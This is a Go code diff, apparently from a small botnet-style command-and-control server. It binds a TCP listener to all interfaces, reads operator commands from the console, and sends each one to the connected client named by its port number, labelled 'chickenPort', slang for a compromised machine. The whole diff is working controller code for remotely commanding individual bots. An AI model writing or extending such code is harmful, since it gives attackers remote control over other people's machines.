@@ -6,6 +6,7 @@ import (
 	"log"
 	"net"
 	"os"
+	"reflect"
 	"strings"
 	"time"
 )
@@ -13,18 +14,30 @@ import (
 func echo(conn *net.TCPConn) {
 	tick := time.Tick(2 * time.Second) // 五秒的心跳间隔
 	for now := range tick {
+		var rAddr = conn.RemoteAddr()
+		fmt.Println(rAddr, " =======>\n")
 		cmd, _ := reader.ReadString('\n')
 		cmd = strings.Replace(cmd, "\n", "", -1)
 		fmt.Println(now, "cmd: ", cmd)
-
-		n, err := conn.Write([]byte(cmd))
-		if err != nil {
-			log.Println(err)
-			conn.Close()
-			return
+		var cmdArr = strings.Split(cmd, " ")
+		var chickenPort string = cmdArr[0]
+		fmt.Println(rAddr, chickenPort, reflect.TypeOf(chickenPort), reflect.TypeOf(rAddr.String()))
+		if chickenPort == strings.Split(rAddr.String(), ":")[1] {
+			var realCmd = strings.Join(cmdArr[1:], " ")
+			fmt.Println("ready execution: ", realCmd)
+			n, err := conn.Write([]byte(realCmd))
+			if err != nil {
+				log.Println(err)
+				conn.Close()
+				return
+			}
+			fmt.Printf("send %d bytes to %s\n", n, rAddr)
+			fmt.Printf("send %s\n", string(realCmd))
+		} else {
+			fmt.Println("loss: ", rAddr)
+			continue
 		}
-		fmt.Printf("send %d bytes to %s\n", n, conn.RemoteAddr())
-		fmt.Printf("send %s\n", string(cmd))
+
 	}
 }
 
@@ -42,9 +55,11 @@ func reply(conn *net.TCPConn) {
 
 var reader = bufio.NewReader(os.Stdin)
 
+var ip = "0.0.0.0"
+
 func main() {
 	address := net.TCPAddr{
-		IP:   net.ParseIP("127.0.0.1"), // 把字符串IP地址转换为net.IP类型
+		IP:   net.ParseIP(ip),
 		Port: 8000,
 	}
 	listener, err := net.ListenTCP("tcp4", &address) // 创建TCP4服务器端监听器
